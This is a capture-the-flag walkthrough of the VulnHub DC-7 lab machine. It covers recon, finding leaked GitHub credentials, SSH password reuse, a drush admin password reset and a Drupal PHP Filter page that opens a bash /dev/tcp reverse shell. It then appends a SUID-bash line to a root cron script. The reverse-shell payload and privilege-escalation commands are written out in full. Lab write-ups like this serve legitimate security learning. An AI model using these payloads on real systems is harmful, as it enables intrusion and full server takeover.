# DC-7 (VulnHub) Walkthrough

**Target:** DC-7 (10.0.2.10, DHCP-assigned on NAT Network — reconfirmed via `sudo nmap -sn 10.0.2.0/24`)  
**Attacker:** Kali Linux (10.0.2.3)

## Recon

Ping sweep to find the current IP:

```
sudo nmap -sn 10.0.2.0/24
```

DC-7 was up at 10.0.2.10. Full port scan:

```
nmap -sC -sV -p- dc-7
```

Two ports: `22/tcp` (OpenSSH 7.4p1) and `80/tcp` (Apache 2.4.25). The `http-generator` field in nmap's output fingerprinted the site as Drupal 8 straight away — no need to guess the CMS.

## Finding the Leak — OSINT Instead of Exploitation

Drupal 8 has no well-known unauthenticated RCE the way Drupal 7 does (that's the DC-1 route), so this box points somewhere else entirely. Checking the homepage source for anything unusual:

```
curl -s http://dc-7/ | grep -i -A3 -B3 "twitter\|@"
```

A content block labelled "Twitter" contained just `@DC7USER`. That's a deliberate OSINT breadcrumb — the same handle is likely reused elsewhere. I checked GitHub directly:

```
curl -s "https://api.github.com/search/repositories?q=user:DC7USER"
```

One hit: a public PHP repo, `Dc7User/staffdb`. Cloned it and looked through the source:

```
git clone https://github.com/Dc7User/staffdb.git /tmp/staffdb
cat /tmp/staffdb/config.php
```

Hardcoded database credentials, committed straight into the repo:

```php
$username = "dc7user";
$password = "MdR3xOgB7#dW";
```

This is a MySQL connection string, not a login form — but the username looked like a real account name, and it's common for people to reuse a password across a DB account and their own Linux login.

## Initial Access

```
ssh dc7user@10.0.2.10
```

Worked immediately — password reuse confirmed the theory. No further exploitation needed for the foothold; the entire "attack" here was OSINT plus a leaked secret.

## Finding the Privilege Escalation Path

Checked local mail first, since a fresh accountsometimes has admin notes waiting:

```
cat /var/mail/dc7user
```

A stream of Cron Daemon messages, subject `Cron <root@dc-7> /opt/scripts/backups.sh`, roughly 15 minutes apart, each reporting "Database dump saved... [success]". A root-owned cron job running a script on a predictable schedule is always worth checking for write access:

```
ls -la /opt/scripts/
```

`backups.sh` was `-rwxrwxr-x`, owned `root:www-data` — group-writable, but by `www-data`, not by `dc7user`.

```
id
```

Confirmed `dc7user` wasn't in that group. I needed a `www-data` shell before this script became useful.

## Pivoting to www-data via Drupal

Since `drush` (Drupal's CLI tool) was already installed and the Drupal root was findable:

```
which drush && find / -iname "sites" -path "*drupal*" 2>/dev/null
```

`drush` connects using the site's own database credentials, which are already configured on disk — so it doesn't need the current admin password to change it:

```
cd /var/www/html
drush user-password admin --password="Passw0rd123!"
```

Logged into `http://dc-7/user/login` as `admin`. Checked **Extend** in the admin panel and found the PHP Filter module already enabled — no need to turn it on myself.

Started a listener:

```
nc -lvnp 4444
```

Created a new Basic Page through **Content → Add content → Basic page**, with the body set to the **PHP code** text format:

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.0.2.3/4444 0>&1'"); ?>
```

Saving and then viewing the page executed the embedded PHP server-side, which fired a reverse shell back to my listener as `www-data`. Upgraded to a full TTY:

```
python -c 'import pty; pty.spawn("bin/bash")'
```

## Privilege Escalation

Now `www-data`, and part of the group that can write to `backups.sh`. Checked the script's existing contents before touching it — it's a legitimate Drupal DB backup/GPG-encryption routine, nothing suspicious, just conveniently writable.

Rather than trying to catch a reverse shell in a narrow cron execution window, I appended a line that creates a persistent SUID root binary — more forgiving of timing:

```
echo 'cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash' >> /opt/scripts/backups.sh
```

Then waited. Confirmed `cron` was genuinely running (`ps aux | grep cron`) and checked the mail spool periodically for new "Cron <root@dc-7>" entries to confirm it was still firing on schedule, since the initial silence had me doubting whether the job was still active. It was — after a couple of 15-minute cycles:

```
ls -la /tmp/rootbash
```

`-rwsr-sr-x root root` — SUID and SGID bits set, confirming root's cron had picked up my appended line and executed it.

```
/tmp/rootbash -p
```

The `-p` flag matters here: bash normally drops elevated privileges the instant it notices its effective UID doesn't match its real UID (a safety measure), so an SUID-root bash launched without `-p` would immediately demote itself back to the invoking user. `-p` tells it to keep the privilege instead.

```
id
```

`euid=0(root) egid=0(root)` — root.

## Capturing the Flag

```
find / -iname '*flag*' 2>/dev/null
cat /root/theflag.txt
```

ASCII-art congratulatory message. Root confirmed, flag captured.

## Summary

| Stage | Technique |
|---|---|
| Recon | Full-port Nmap scan — Drupal 8 fingerprinted via `http-generator` |
| Finding the Leak | Homepage OSINT clue (`@DC7USER`) → GitHub API search → public repo with hardcoded DB credentials |
| Initial Access | SSH password reuse of the leaked DB credential |
| Discovering the Path | Local mail spool revealed a root cron job on a group-writable script |
| Privilege Pivot | `drush` password reset (no original hash needed) → Drupal admin → PHP Filter module → `exec()` reverse shell → `www-data` |
| Privilege Escalation | Appended a SUID-root payload to the cron-run script, waited for root's cron to execute it |
| Capturing the Flag | `cat /root/theflag.txt` |
